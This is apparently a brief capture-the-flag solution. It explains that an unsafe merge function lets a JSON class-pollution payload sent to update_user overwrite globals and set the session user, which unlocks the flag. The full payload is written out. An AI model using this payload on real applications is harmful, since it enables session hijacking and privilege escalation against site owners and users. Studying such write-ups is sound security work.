The vulnerable function is an unsafe merge. To exploit it, place this payload into the input at update_user : 

 {"__class__":{"__init__":{"__globals__":{"session":{"user":"Ben Dover"}}}}}

 This changes the session's user to "Ben Dover", which opens up the flag.